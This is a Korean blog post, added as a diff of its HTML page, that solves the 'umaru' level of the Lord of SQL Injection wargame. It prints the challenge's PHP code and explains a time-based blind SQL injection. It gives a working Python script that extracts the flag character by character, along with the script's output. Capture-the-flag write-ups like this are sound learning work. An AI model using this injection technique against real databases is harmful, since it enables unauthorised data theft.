@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html class="no-js">
+  <head>
+	<meta charset="utf-8">
+	<title>[Lord of SQL Injection : eagle-jump] LoS - umaru 문제풀이 | mingzzi</title>
+	<meta name="description" content="내가 지금 문제를 풀고 있는 서버는 los.rubiya.kr인데, los.eagle-jump.ord에도 같은 문제가 있다.그런데 eagle-jump 서버의 마지막 문제는 rubiya의 서버에 없는 것 같아 따로 풀어보게 되었다.">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<!-- CSS -->
+	<link rel="stylesheet" href="/assets/css/main.css">
+
+	<!--Favicon-->
+	<link rel="shortcut icon" href="/assets/favicon.ico" type="image/x-icon">
+
+	<!-- Canonical -->
+	<link rel="canonical" href="/wargame/lord%20of%20sql%20injection/2018/08/24/los-umaru.html">
+
+	<!-- RSS -->
+	<link rel="alternate" type="application/atom+xml" title="mingzzi" href="/feed.xml" />
+
+	<!-- Font Awesome -->
+	<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+	<!-- Google Fonts -->
+	
+	<link href="https://fonts.googleapis.com/css?family=Nanum+Gothic:400,700" rel="stylesheet">
+	
+
+	<!-- KaTeX -->
+	
+	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.css">
+	<script src="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.js"></script>
+	
+
+	<!-- Google Analytics -->
+	
+	<script>
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+	ga('create', 'UA-130304424-1', 'auto');
+	ga('send', 'pageview');
+	</script>
+	
+</head>
+
+  <header class="site-header">
+	<div class="branding">
+		
+		<a href="/">
+			<img class="avatar" src="/assets/img/blogmark.png" alt=""/>
+		</a>
+		
+		<h1 class="site-title">
+			<a href="/">mingzzi</a>
+		</h1>
+		<nav class="site-nav">
+				<ul>
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/about/">
+									About
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/tags.html">
+									tags
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+
+					<!-- Search bar -->
+					
+					<li>
+					<form action="/search.html" method="get">
+						<input type="text" id="search-box" name="query" placeholder="Search" class="">
+						<button type="submit" class="">
+							<i class="fa fa-fw fa-search"></i>
+						</button>
+					</form>
+					</li>
+					
+				</ul>
+		</nav>
+	</div>
+
+	<div class="site-category">
+			<ul class='cat1'>
+				<li><a href="/">Home</a></li>
+				<li><a href="/">Pentesting</a>
+					<ul>
+						<li><a href="/Pentest/iOS">iOS</a></li>
+						<li><a href="/Pentest/Android">Android</a></li>
+						<li><a href="/Pentest/PWeb">Web</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Wargame</a>
+					<ul>
+						<li><a href="/Wargame/LoS">Load of SQL Injection</a></li>
+						<li><a href="/Wargame/Pwnkr">Pwnable.kr</a></li>
+						<li><a href="/Wargame/Warkr">Wargame.kr</a></li>
+						<li><a href="/Wargame/XG">XSS Game</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">CTF</a>
+					<ul>
+						<li><a href="/CTF/2018">2018</a></li>
+						<li><a href="/CTF/2019">2019</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Error</a>
+					<ul>
+						<li><a href="/Error/Linux">Linux</a></li>
+						<li><a href="/Error/Python">Python</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Development</a>
+					<ul>
+						<li><a href="/Develop/Database">Database</a></li>
+						<li><a href="/Develop/Blog">Github Blog</a></li>
+						<li><a href="/Develop/DWeb">Web</a></li>
+						<li><a href="/Develop/Docker">Docker</a></li>
+						<li><a href="/Develop/Basic">Basic</a></li>
+					</ul>
+				</li>
+			</ul>
+		</div>
+
+</header>
+
+  <body>
+    <div class="content">
+      <article >
+  <header style="background-image: url('/')">
+    <h1 class="title">[Lord of SQL Injection : eagle-jump] LoS - umaru 문제풀이</h1>
+    
+    <p class="meta">
+      August 24, 2018
+      
+    </p>
+  </header>
+  <section class="post-content"><p>내가 지금 문제를 풀고 있는 서버는 <code class="highlighter-rouge">los.rubiya.kr</code>인데, <code class="highlighter-rouge">los.eagle-jump.ord</code>에도 같은 문제가 있다.</p>
+
+<p>그런데 <code class="highlighter-rouge">eagle-jump</code> 서버의 마지막 문제는 <code class="highlighter-rouge">rubiya</code>의 서버에 없는 것 같아 따로 풀어보게 되었다.</p>
+
+<!--more-->
+
+<p>코드는 다음과 같다.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+  <span class="k">include</span> <span class="s2">"./config.php"</span><span class="p">;</span>
+  <span class="nx">login_chk</span><span class="p">();</span>
+  <span class="nx">dbconnect</span><span class="p">();</span>
+
+  <span class="k">function</span> <span class="nf">reset_flag</span><span class="p">(){</span>
+    <span class="nv">$new_flag</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nb">rand</span><span class="p">(</span><span class="mi">10000000</span><span class="p">,</span><span class="mi">99999999</span><span class="p">)</span><span class="o">.</span><span class="s2">"qwer"</span><span class="o">.</span><span class="nb">rand</span><span class="p">(</span><span class="mi">10000000</span><span class="p">,</span><span class="mi">99999999</span><span class="p">)</span><span class="o">.</span><span class="s2">"asdf"</span><span class="o">.</span><span class="nb">rand</span><span class="p">(</span><span class="mi">10000000</span><span class="p">,</span><span class="mi">99999999</span><span class="p">)),</span><span class="mi">8</span><span class="p">,</span><span class="mi">16</span><span class="p">);</span>
+    <span class="nv">$chk</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"select id from prob_umaru where id='</span><span class="si">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nx">los_id</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">));</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$chk</span><span class="p">[</span><span class="nx">id</span><span class="p">])</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"insert into prob_umaru values('</span><span class="si">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nx">los_id</span><span class="p">]</span><span class="si">}</span><span class="s2">','</span><span class="si">{</span><span class="nv">$new_flag</span><span class="si">}</span><span class="s2">')"</span><span class="p">);</span>
+    <span class="k">else</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"update prob_umaru set flag='</span><span class="si">{</span><span class="nv">$new_flag</span><span class="si">}</span><span class="s2">' where id='</span><span class="si">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nx">los_id</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="s2">"reset ok"</span><span class="p">;</span>
+    <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+    <span class="k">exit</span><span class="p">();</span>
+  <span class="p">}</span>
+
+  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">flag</span><span class="p">]){</span> <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span> <span class="k">exit</span><span class="p">;</span> <span class="p">}</span>
+
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/prob|_|\./i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">flag</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/id|where|order|limit|,/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">flag</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"HeHe"</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">flag</span><span class="p">])</span><span class="o">&gt;</span><span class="mi">100</span><span class="p">)</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"HeHe"</span><span class="p">);</span>
+
+  <span class="nv">$realflag</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"select flag from prob_umaru where id='</span><span class="si">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nx">los_id</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">));</span>
+
+  <span class="o">@</span><span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"create temporary table prob_umaru_temp as select * from prob_umaru where id='</span><span class="si">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nx">los_id</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">);</span>
+  <span class="o">@</span><span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"update prob_umaru_temp set flag=</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">flag</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>
+
+  <span class="nv">$tempflag</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"select flag from prob_umaru_temp"</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">((</span><span class="o">!</span><span class="nv">$realflag</span><span class="p">[</span><span class="nx">flag</span><span class="p">])</span> <span class="o">||</span> <span class="p">(</span><span class="nv">$realflag</span><span class="p">[</span><span class="nx">flag</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$tempflag</span><span class="p">[</span><span class="nx">flag</span><span class="p">]))</span> <span class="nx">reset_flag</span><span class="p">();</span>
+
+  <span class="k">if</span><span class="p">(</span><span class="nv">$realflag</span><span class="p">[</span><span class="nx">flag</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">flag</span><span class="p">])</span> <span class="nx">solve</span><span class="p">(</span><span class="s2">"umaru"</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>뭔가 엄청 복잡 해 보인다.</p>
+
+<p>자세히 살펴보면, <code class="highlighter-rouge">reset_flag()</code> 라는 함수에서 <code class="highlighter-rouge">$new_flag</code>라는 변수를 생성한다.</p>
+
+<p>이 변수는 <code class="highlighter-rouge">랜덤숫자+qwer+랜덤숫자+asdf</code>를 <code class="highlighter-rouge">md5</code>로 해싱한 후 16글자만을 자른 값이다.</p>
+
+<p>그 후, 나의 <code class="highlighter-rouge">los_id</code>와 함께 테이블에 값을 저장한다.</p>
+
+<p>내가 넘길 수 있는 쿼리스트링은 <code class="highlighter-rouge">flag</code> 뿐이다.</p>
+
+<p>그런데 <code class="highlighter-rouge">$_GET['flag']</code>가 여러 곳에서 사용되는데, 내가 <code class="highlighter-rouge">flag</code>의 값을 넘겨주면, 몇 가지 필터링을 검사한 후 데이터베이스에 저장 된 나의 <code class="highlighter-rouge">flag</code>를 찾아 <code class="highlighter-rouge">prob_umaru_temp</code> 테이블에 저장한다.</p>
+
+<p>이 후, 이 테이블에 내가 입력 한 <code class="highlighter-rouge">flag</code>의 값을 임시로 새로 생성 한 테이블에 저장한다.</p>
+
+<p>그리고 원래 테이블에 저장되어 있던 <code class="highlighter-rouge">flag</code>의 값과, 임시 테이블에 저장되어 있는 <code class="highlighter-rouge">flag</code>의 값을 비교하는데, 만약 값이 다르거나 원래 테이블에 <code class="highlighter-rouge">flag</code>가 없다면 <code class="highlighter-rouge">reset_flag()</code> 함수를 실행시킨다.</p>
+
+<p>즉, <code class="highlighter-rouge">flag</code>를 맞추지 못하면 계속 랜덤 값으로 <code class="highlighter-rouge">flag</code>가 바뀐다. ㅠㅠ</p>
+
+<p>따라서 문제를 풀기 위해서는 다음과 같은 조건이 필요하다.</p>
+
+<blockquote>
+  <ol>
+    <li>flag의 값은 100글자를 넘기지 말 것</li>
+    <li>flag가 갱신되지 않도록 update 쿼리문에서 에러를 발생시킬 것</li>
+    <li>,를 사용할 수 없기 때문에 sleep 함수를 사용해 값을 찾을 것</li>
+  </ol>
+</blockquote>
+
+<p>일단 문제에서 해쉬값 중 16글자를 잘라 테이블에 저장하므로, <code class="highlighter-rouge">flag</code>의 길이는 16글자임을 알 수 있다.</p>
+
+<p>때문에 값만 찾아내면 된다.</p>
+
+<p>일단 위의 조건을 만족하는 쿼리를 찾기 위해 서버에서 이것저것 테스트 해 보았다.</p>
+
+<p>제일 먼저 찾은 쿼리는 다음과 같다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>update prob_umaru_temp set flag=sleep(3 * (flag like 'a%')) + (select 1 union select 2)
+</code></pre></div></div>
+
+<p>이러면 먼저 <code class="highlighter-rouge">sleep()</code> 함수 내에서 <code class="highlighter-rouge">flag</code>의 값이 <code class="highlighter-rouge">a%</code>와 같은지를 비교하고, 같다면 <code class="highlighter-rouge">1</code>이 되기 때문에 <code class="highlighter-rouge">sleep(3*1)</code>이 만들어 진다.</p>
+
+<p>즉, 3초 동안 <code class="highlighter-rouge">sleep()</code> 함수를 실행하게 된다.</p>
+
+<p>반면 다를 경우에는 <code class="highlighter-rouge">flag like 'a%'</code>가 0이 되어 <code class="highlighter-rouge">sleep(3*0)</code>이 만들어 지기 때문에 <code class="highlighter-rouge">sleep()</code> 함수를 실행하지 않는다.</p>
+
+<p><code class="highlighter-rouge">sleep()</code> 함수를 실행한 후에는 <code class="highlighter-rouge">+</code>연산으로 연결 된 <code class="highlighter-rouge">select 1 union select 2</code>를 실행하는데, 이 전 문제들에서도 사용했다시피 해당 쿼리는 에러를 유발한다.</p>
+
+<p>때문에 결과적으로 완성되는 쿼리는 에러가 발생하기 때문에 <code class="highlighter-rouge">update</code> 문을 실행하지 않게 되고, <code class="highlighter-rouge">prob_umaru_temp</code> 테이블과 <code class="highlighter-rouge">prob_umaru</code> 테이블에 저장된 <code class="highlighter-rouge">flag</code>의 값은 일치하기 때문에 <code class="highlighter-rouge">reset_flag()</code> 함수를 실행하지 않는다.</p>
+
+<p>그래서 이를 바탕으로 코드를 구현해서 테스트 해 보았는데, 아무리 해도 결과가 나오지 않았다.</p>
+
+<p>내 서버에서는 잘 되는데, 문제 서버에서는 안되길래 뭔가 설정이 다르게 되어있나 싶어서 연산자를 이것저것으로 바꿔 보았다.</p>
+
+<p>그 결과 <code class="highlighter-rouge">|</code>를 쓰니 값을 추출할 수 있었다.</p>
+
+<p>구현한 코드는 아래와 같다.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">urllib2</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="n">flag</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">length</span> <span class="o">=</span> <span class="mi">16</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"https://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php?flag="</span>
+<span class="n">session</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">PHPSESSID</span> <span class="o">=</span> <span class="s">"YOUR SESSION ID"</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="s">"[+] Start"</span>
+
+<span class="k">print</span> <span class="s">"[+] Find password"</span>
+
+<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">48</span><span class="p">,</span> <span class="mi">123</span><span class="p">):</span>
+		<span class="k">try</span><span class="p">:</span>
+			<span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+			<span class="n">query</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"sleep(3 * (flag like '"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="o">+</span><span class="s">"</span><span class="si">%</span><span class="s">')) | (select 1 union select 2)"</span>
+			<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">session</span><span class="p">)</span>
+		<span class="k">except</span><span class="p">:</span>
+			<span class="k">print</span> <span class="s">"[-] Error occur"</span>
+			<span class="k">continue</span>
+
+		<span class="k">if</span> <span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">:</span>
+			<span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+			<span class="k">print</span> <span class="s">"[+] Found "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">),</span> <span class="s">":"</span><span class="p">,</span> <span class="n">flag</span>
+			<span class="k">break</span>
+
+<span class="k">print</span> <span class="s">"[+] Found password : "</span><span class="p">,</span> <span class="n">flag</span>
+<span class="k">print</span> <span class="s">"[+] End"</span>
+</code></pre></div></div>
+
+<p>이 코드를 돌리면 아래와 같은 결과를 얻을 수 있다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python ex.py 
+[+] Start
+[+] Find password
+[+] Found 1 : 8
+[+] Found 2 : 89
+[+] Found 3 : 892
+[+] Found 4 : 8925
+[+] Found 5 : 89253
+[+] Found 6 : 892531
+[+] Found 7 : 8925316
+[+] Found 8 : 89253169
+[+] Found 9 : 89253169C
+[+] Found 10 : 89253169CE
+[+] Found 11 : 89253169CE9
+[+] Found 12 : 89253169CE98
+[+] Found 13 : 89253169CE987
+[+] Found 14 : 89253169CE987D
+[+] Found 15 : 89253169CE987D1
+[+] Found 16 : 89253169CE987D15
+[+] Found password :  89253169CE987D15
+[+] End
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">php</code>에서 <code class="highlighter-rouge">md5</code> 함수를 사용하면 알파벳 소문자로 값이 출력되므로, 데이터베이스에 저장된 값도 소문자로 이루어져 있을 것이다.</p>
+
+<p>따라서 알파벳 대문자를 소문자로 바꾸어 아래와 같이 입력했다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?flag=89253169ce987d15
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">eagle-jump</code> 서버를 <code class="highlighter-rouge">All Clear</code> 했다!!!</p>
+
+<p>이제 <code class="highlighter-rouge">rubiya</code> 서버에도 몇 문제 안남았으니 빨리 다 풀어야지 ㅎㅎㅎ</p>
+
+<p><code class="highlighter-rouge">UMARU Clear!</code></p>
+
+<p><img src="/images/los/umaru/umaru_01.png" alt="" /></p>
+</section>
+  
+<footer>
+  <div class="tags">
+    
+    <a class="tag" href="/tags#Write-up">#Write-up</a>
+    
+    <a class="tag" href="/tags#Lord of SQL Injection">#Lord of SQL Injection</a>
+    
+  </div>
+</footer>
+
+
+</article>
+<!-- Disqus -->
+<a href="https://devYurim.github.io/wargame/lord%20of%20sql%20injection/2018/08/24/los-umaru.html#disqus_thread"></a>
+
+<div class="comments">
+  
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://https-devyurim-github-io-1.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                            
+
+</div>
+
+
+<!-- Post navigation -->
+
+  <div id="post-nav">
+  
+  <div id="previous-post" class="post-nav-post">
+      <p>Previous post</p>
+      <a href="/wargame/lord%20of%20sql%20injection/2018/08/24/los-evil_wizard.html">
+        [Lord of SQL Injection] LoS - evil_wizard 문제풀이
+      </a>
+  </div>
+  
+  
+  <div id="next-post" class="post-nav-post">
+      <p>Next post</p>
+      <a href="/wargame/lord%20of%20sql%20injection/2018/08/25/los-green_dragon.html">
+        [Lord of SQL Injection] LoS - green_dragon 문제풀이
+      </a>
+  </div>
+  
+</div>
+
+
+
+    </div>
+    
+<script src="/assets/js/katex_init.js"></script>
+
+
+
+<footer class="site-footer">
+	<p class="text">Powered by <a href="https://jekyllrb.com/">Jekyll</a> with <a href="https://github.com/rohanchandra/type-theme">Type Theme</a>
+</p>
+</footer>
+
+
+    <script id="dsq-count-scr" src="//.disqus.com/count.js" async></script>
+
+    <!-- Google Analytics Tracking code -->
+<script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', '']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+</script>
+
+  </body>
+</html>
